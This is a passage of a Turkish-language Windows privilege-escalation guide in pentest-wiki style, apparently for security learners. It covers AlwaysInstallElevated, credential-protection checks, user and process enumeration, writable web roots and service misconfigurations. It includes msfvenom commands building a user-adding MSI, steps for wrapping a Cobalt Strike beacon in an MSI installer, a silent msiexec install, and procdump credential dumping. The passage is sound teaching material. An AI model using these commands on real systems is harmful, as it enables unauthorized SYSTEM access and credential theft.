Gerçek DC'nin [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) ve [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding) ilkelerini, relay edilen kimliğin nesne ACL'sini ve seçilen COM sınıfının kimlik doğrulama ve impersonation seviyelerini kontrol edin. Çağrıyı yapanın oturum açma türü ve kimlik bilgisi bağlamı önemlidir: Bir WinRM oturumu, etkileşimli oturumdan veya yeni kimlik bilgileriyle açılmış bir oturumdan farklı davranabilir. Güvenlik duvarı/OXID yönlendirmesi ve kurulu güncellemeler de sonucu değiştirebilir. İzin veren bir ilkeyi veya eşleşen bir ACL'yi incelemeye değer bir durum olarak değerlendirin; pasif numaralandırma COM coercion, relay kimlik doğrulaması veya dizine yazma işlemlerini tetiklememelidir. Bir makine hesabının shadow credential'ı makine bileti sağlayabilir; bu da ancak hesabın gerekli dizin çoğaltma izinlerine sahip olması durumunda ayrı bir DCSync yoluna imkân tanır.

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) adresinde **exploit'i bulun**

Saldırı akışı hakkında daha fazla bilgi için [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> adresini inceleyin.

## AlwaysInstallElevated

Bu 2 kayıt defteri girdisi **etkinse** (değerleri **0x1** ise), herhangi bir ayrıcalık düzeyindeki kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **yükleyebilir** (yürütebilir).

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz.

### PowerUP

Mevcut dizinde ayrıcalıkları yükseltmek için bir Windows MSI binary'si oluşturmak üzere power-up'taki `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup ekleme istemi gösteren önceden derlenmiş bir MSI installer yazar (bu nedenle GIU erişiminiz olması gerekir):

```
Write-UserAddMSI
```

Oluşturulan binary'yi çalıştırarak ayrıcalıkları yükseltmeniz yeterli.

### MSI Wrapper

Bu araçları kullanarak MSI wrapper oluşturmayı öğrenmek için bu öğreticiyi okuyun. Yalnızca **command line** komutlarını **çalıştırmak** istiyorsanız "**.bat**" dosyasını da wrapper içine alabileceğinizi unutmayın.


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX ile MSI Oluşturma


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio ile MSI Oluşturma

- Cobalt Strike veya Metasploit ile `C:\privesc\beacon.exe` konumunda **yeni bir Windows EXE TCP payload** **oluşturun**.
- **Visual Studio**'yu açın, **Create a new project**'i seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçip **Next**'e tıklayın.
- Projeye **AlwaysPrivesc** gibi bir ad verin, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory** seçeneğini işaretleyin ve **Create**'e tıklayın.
- Dosyaları ekleme adımı olan 4 adımdan 3.'ye gelene kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'ını seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini vurgulayın ve **Properties** bölümünde **TargetPlatform** değerini **x86**'dan **x64**'e değiştirin.
  - Yüklenen uygulamanın daha meşru görünmesini sağlayabilecek **Author** ve **Manufacturer** gibi başka özellikleri de değiştirebilirsiniz.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'a sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Böylece yükleyici çalıştırılır çalıştırılmaz beacon payload'ı çalıştırılır.
- **Custom Action Properties** bölümünde **Run64Bit** değerini **True** olarak değiştirin.
- Son olarak **build** edin.
  - `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı gösterilirse platformu x64 olarak ayarladığınızdan emin olun.

### MSI Kurulumu

Kötü amaçlı `.msi` dosyasının **kurulumunu** arka planda çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Algılayıcılar

### Denetim Ayarları

Bu ayarlar nelerin **günlüğe kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding'de günlüklerin nereye gönderildiğini bilmek ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** ve her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlamak için tasarlanmıştır. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından görüntülenebilir.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sistemi daha da güvenli hâle getirmek için güvenilmeyen işlemlerin Local Security Authority (LSA) belleğini **okuma** veya kod enjekte etme girişimlerini **engellemek** üzere gelişmiş koruma sunmuştur.\
[**LSA Protection hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10**'da kullanıma sunuldu. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Etki alanı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle etki alanı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilgi çekici izinlere sahip olup olmadığını kontrol etmelisiniz.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir grubun üyesiyseniz yetkilerinizi yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları yetkilerinizi yükseltmek için nasıl kötüye kullanabileceğiniz hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token** hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
**İlginç tokenlar** ve bunları nasıl kötüye kullanabileceğiniz hakkında bilgi edinmek için aşağıdaki sayfaya göz atın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Kullanıcı klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola İlkesi

```bash
net accounts
```

### Panonun içeriğini alın

```bash
powershell -command "Get-Clipboard"
```

## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Öncelikle, işlemleri listelerken **işlemin komut satırında parola olup olmadığını kontrol edin**.\
Çalışan herhangi bir binary dosyanın üzerine yazıp yazamayacağınızı veya olası [**DLL Hijacking attacks**](dll-hijacking/index.html) saldırılarından yararlanmak için binary dosyanın klasöründe yazma izniniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers** olup olmadığını kontrol edin; ayrıcalıkları yükseltmek için bunlardan yararlanabilirsiniz](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Bir debugger listener kısa süreliğine açık olabilir; bu nedenle tek bir pasif port anlık görüntüsünde görünmemesi, hiçbir zaman erişime açık olmadığını kanıtlamaz. Gözlemlenen listener'ları PID, süreç sahibi ve daha düşük ayrıcalıklı kullanıcının bunlara erişip erişemediğiyle ilişkilendirin; yalnızca uygulama adı veya debug flag, kullanıcılar arası kod yürütme olanağını kanıtlamaz. Rutin envanter çıkarma işlemlerini pasif tutun; debugger komutları göndermeyin.

**Süreçlerin binary dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Süreç ikililerinin klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dynamic preprocessor dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada belirtilen `dynamicpreprocessor directory` dizininden paylaşımlı kitaplıklar yükleyebilir. Snort'u farklı bir hesapla çalıştıran zamanlanmış bir görev veya hizmet varsa, tam olarak bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız bu dizinde dosya oluşturabiliyorsa görev veya hizmet modülleri bir sonraki yüklediğinde bu yol code execution açısından incelenmeye adaydır. Çalıştıran hesabın etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve tüm deny veya paylaşım kısıtlamalarını doğrulayın; yalnızca dizinin yazılabilir olması privilege escalation gerçekleştiğini kanıtlamaz. [Snort'un dynamic-preprocessor belgeleri](https://www.snort.org/documents/dpx-readme), çalışma zamanında modül yüklemeyi açıklar.

### Yazılabilir document root'a sahip ayrıcalıklı web hizmeti

Windows Apache kurulumunda hizmetin yürütülebilir dosya yolunu ve çalıştıran hesabını, etkin `httpd.conf` dosyasındaki `DocumentRoot` ile karşılaştırın. Yaygın bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış document root'un ACL'sini inceleyin; bu dizin genellikle `C:\xampp\htdocs` olur. Apache `LocalSystem` olarak çalışırken daha düşük ayrıcalıklı bir kullanıcı bu dizinde dosya oluşturabiliyorsa, sunucu tarafında code execution ana makinenin ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam olarak bu yolun sunulduğunu ve dosya türünün sunucu tarafında işlendiğini doğrulayın; tek başına yazılabilir bir kök dizin yalnızca dosya oluşturulabildiğini kanıtlar. Dosya yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Geleneksel bir WAMP kurulumunda hizmet, sürümü belirtilmiş bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasına (32 bit düzen için `C:\wamp\...`) işaret edebilir; yapılandırma dosyası da yanında, `conf\httpd.conf` altında bulunabilir. Varsayılan kök dizin `C:\wamp64\www` veya `C:\wamp\www` olabilir. Hizmetin tam görüntü yolunu, çalıştırma kimliğini, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana bilgisayar geçersiz kılmaları dahil) ve kök ACL’sini birlikte kontrol edin. WAMP dizininin yazılabilir olması, Apache’nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı çalıştırdığını kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeler](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kökü ve uygulama havuzu ağ kimliği

IIS için, yazılabilir fiziksel dizini `applicationHost.config` içindeki **etkin bir siteye/uygulamaya** eşleyin; ardından yapılandırılmış havuzunu ve sunucu tarafı işleyicisini belirleyin. Sunulan bir dizine yerleştirilen kod, yalnızca IIS o dosya türünü işliyorsa ve bu rotaya erişilebiliyorsa uygulama havuzunun kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce mevcut kullanıcının etkili dosya oluşturma erişimini, site çalışma durumunu, işleyiciyi ve yol başına geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol oluşturur: uygulamanın derleme dizinindeki oluşturulmuş dosyalar. Varsayılan konum, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft, konumu ve uygulamaya özel alt dizinleri belgeler](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını önerir](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynak dosyalarını değiştirebiliyorsa uygulamanın bunları daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL’si kod yürütüldüğünü kanıtlamaz: önbelleği etkin uygulama, etkili token ve ACL, derleme ayarları, işlem kimliği ve yeniden derleme zamanlamasıyla ilişkilendirin. Salt okunur meta veri incelemesi yapın; envanter çıkarırken derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token’ı düşük ayrıcalıklı olsa bile genellikle etki alanı kaynaklarında **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` yerelde zaten yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise normalde anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu, yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) belgeler. Kimlik ayarının belirtilmemesi, IIS sürümleri arasında farklılık gösteren havuz varsayılanlarının devralınmasına yol açabilir; bu nedenle havuz adına bakarak tahmin etmek yerine etkin yapılandırmayı belirleyin. Kod yürütme, ağda bilgisayar kimliği kullanan bir havuza ulaşıyorsa **ilgili bilgisayarın** dizin izinlerini değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma izinleri gerektirir; makine hesabı bileti veya ana bilgisayar rolü tek başına bu izinlerin varlığını kanıtlamaz. Pasif envanter çıkarma sırasında dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırmaları ve ACL’leri inceleyin.

Yardımcı bir işlem başlatan, okunabilir bir ASP.NET işleyicisinde, istekten türetilen tüm değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma adımlarında izleyin. Kod çözülmüş bir token’ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren bir işleyici, kabuk metakarakterlerinin komutu değiştirmesine izin verebilir; [Microsoft, `cmd` özel karakterlerini belgeler](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın kodu çözülmüş değeri gerçekten etkileyebildiğini ve işleyiciye ulaşabildiğini doğrulayın; ardından etkin uygulama havuzu veya kimliğe bürünülmüş kimliği ve alt işlemin kimliğini belirleyin. Okunabilir bir kaynak satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütüldüğünü kanıtlamaz. Pasif envanter çıkarma sırasında sahte istek göndermeden veya yardımcı işlemi çalıştırmadan kaynak kodunu ve havuz yapılandırmasını inceleyin.

Windows üzerindeki bir PHP hizmetinde, istekle denetlenen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) içine aktarılan bir yol, düşük kullanıcının yazabildiği bir PHP dosyasını worker kimliğiyle değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve worker’ın okuyabildiği bir dosyayı gösterdiğini, geçerli PHP yol kısıtlamalarının bu include işlemine izin verdiğini ve worker’ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Tek başına bir loopback dinleyicisi veya yazılabilir dosya bu zinciri kanıtlamaz; pasif envanter çıkarma sırasında endpoint’i çağırmadan kaynak kodunu, hizmet kimliğini ve dosya ACL’lerini inceleyin.

### Bellekten parola madenciliği

Sysinternals’taki **procdump** aracını kullanarak çalışan bir işlemin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin **kimlik bilgileri bellekte açık metin olarak bulunur**; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" aratın ve "Click to open Command Prompt" seçeneğine tıklayın.

### Ayrıcalıklı proje dosyası içe aktarma

Daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir bırakma dizinindeki projeleri otomatik olarak açan bir uygulama, içe aktarıcının hesabı altında bir girdi güven sınırını aşar. **Yazılabilir tam yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcı derlemesini inceleyin. [Geçmişteki bir Ghidra proje açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde XML harici varlıklarının kullanılmasına izin veriyordu; Windows'taki bir ağ varlığı, [giden SMB ve NTLM ilkesi](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktaran hesaptan kimlik doğrulama isteğine yol açabilirdi. Bu, kimlik bilgilerinin açığa çıkmasına yönelik bir bulgudur; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı bir yetkili veya savunmasız yol üzerinden kullanılabilmesi gerekir ve güncel derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif keşif sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesinin [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için salt okunur bir [`OpenSCManager` erişim isteğinin](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) başarılı olması, incelemeye değer bir bulgudur; yeni bir hizmetin çalıştırılabileceğinin kanıtı değildir. [`CreateService` bir tanıtıcı döndürür](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew); bu tanıtıcı, oluşturma sırasında istenen hizmet erişim haklarına sahiptir. Hizmeti daha sonra yeniden açmak ayrı bir erişim denetimi gerçekleştirir ve ilk tanıtıcı kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak belirteci, tanıtıcıya verilen hakları, hizmet hesabını, başlatma ilkesini ve yürütülebilir dosyanın yolunu ayrı ayrı doğrulayın. Pasif keşif sırasında hizmet oluşturmayın veya başlatmayın.

Uzak hizmet kurulum yolunda, söz konusu SCM haklarını hedefte aynı **ağ oturum açma bilgileriyle** yazılabilen bir paylaşımla, paylaşımın temelindeki NTFS ACL'siyle ve hizmet hesabının çalıştırabileceği yerel bir yürütülebilir dosya yoluyla ilişkilendirin. Alışılmadık ölçüde geniş SCM hakları ve dosya yerleştirme yolu birlikte mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Paylaşıma yazma erişimi tek başına veya hizmet oluşturma hakkına ilişkin bulgu tek başına, yeni hizmetin daha yüksek ayrıcalıklı bir kimlikle başlayabileceğini göstermez.

Mevcut bir hizmet, yardımcı dosya `ImagePath` içinde belirtilmemiş olsa bile başlangıçta, kapanışta veya başka bir yaşam döngüsü olayında yardımcı bir yürütülebilir dosyayı çağırabilir. Yardımcı dosyanın adı daha düşük ayrıcalıklı bir kullanıcının yazabildiği bir dizinde çözümleniyorsa ve hizmet daha yüksek ayrıcalıklı bir kimlikle çalışıyorsa, eksik dosya koşullu bir değiştirme adayıdır. **Hizmetin gerçek kodunu veya belgelenmiş yardımcı çağrısını**, çözümlenen yürütülebilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına, hizmetin bu dosyayı yüklediğini göstermez; pasif inceleme sırasında hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService`'e bağımsız değişken sağlamaya izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) hakkından ayrıdır. Başlatma erişimini yalnızca bir denetim hakkından fazlası olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Hizmet, çağıranın seçtiği bir bağımsız değişkeni günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, bağımsız değişkenden dosyaya yazma akışını, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma, yalnızca ayrı bir ayrıcalıklı tüketici veya bu dosyayı kabul eden bir yükleyici varsa ayrıcalık yükseltmeye dönüşebilir; yazılabilir bir günlük veya başlatma hakkı tek başına yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, **yapılandırma incelemesi için bir bulgudur**: web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremeyeceğini kontrol edin. Ayrıcalıklı yürütme için ayrıca `CheckExternalScripts` (veya başka bir etkin yürütme yolu), komut kaydetme ya da değiştirme için etkin bir hak ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback adresini dinleyen bir dinleyiciye yerel kullanıcı yine de erişebilir; ancak dosya yolu, parola veya dinleyici tek başına bu hakları kanıtlamaz. Pasif keşif sırasında gizli bilgileri görüntülemeden veya web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya düzeni](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenliği yönergeleri](https://nsclient.org/docs/setup/securing/) ve [harici script yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmette, hizmetin gerçekten hangi hesapla çalıştığını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM, alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Sarmalayıcının izinlerini hizmet sınırının tamamı olarak değerlendirmeden önce alt yürütülebilir dosyanın ve üst dizinlerinin ACL'lerini kontrol edin. Alt uygulamanın sunduğu yerel bir WCF veya SOAP uç noktası ayrı bir inceleme bulgusudur: daha düşük ayrıcalıklı kullanıcının dinleyiciye erişebildiğini, ilgili işlemin kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek ayrıcalıklı bir kimlikle yürüttüğünü doğrulayın. Hizmet hesabı, uç nokta URL'si veya yazılabilir bir yol tek başına ayrıcalık yükseltmeyi kanıtlamaz; pasif keşif sırasında hizmet işlemlerini çağırmayın.

Özel bir WCF işleminde, çağıranın denetimindeki bir dizgenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript` script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), [`Pipeline.Invoke` ise pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows aktarım kimlik bilgileri kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca denetlenmelidir. Daha düşük ayrıcalıklı çağıranın girdisinden daha yüksek ayrıcalıklı hizmet kimliği altında `AddScript`'e giden bir yol, kod yürütme sınırıdır; dinleme yapan bir port, kimliği doğrulanmış bir istemci veya ilgisiz bir derlemedeki kullanılmayan bir yöntem tek başına kanıt değildir. Keşif sırasında uç noktayı çağırmadan dağıtılmış hizmeti, sözleşmeyi, yetkilendirme ve kimliğe bürünme ayarlarını statik olarak inceleyin.

Service Triggers, Windows'un belirli koşullar oluştuğunda (adlandırılmış pipe/RPC uç noktası etkinliği, ETW olayları, IP kullanılabilirliği, aygıt bağlanması, GPO yenilemesi vb.) bir hizmeti başlatmasını sağlar. SERVICE_START hakları olmadan bile, tetikleyicilerini etkinleştirerek ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Keşif ve etkinleştirme tekniklerini burada bulabilirsiniz:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında, `LocalSystem` olarak çalışacak şekilde yapılandırılmış bir tanılama hizmeti olan `VSStandardCollectorService150` bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/), hizmetin DACL sıfırlamasını başka yere yönlendirmek için bir junction ve object-manager-link yarış koşulundan yararlandı. Gösterilen ayrıcalık yükseltme yöntemi ayrıca kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolunu ve `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefini gerektiriyordu. Bu bileşen Ocak 2024'te düzeltildi.

Pasif ön inceleme için bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve yüklenen bileşenin yama durumunu doğrulayın. Bir hizmet kaydı, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana makinenin savunmasız olduğunu göstermez. İnceleme sırasında hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir hizmet hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_'tan **accesschk** binary'sinin bulunması önerilir.

```bash
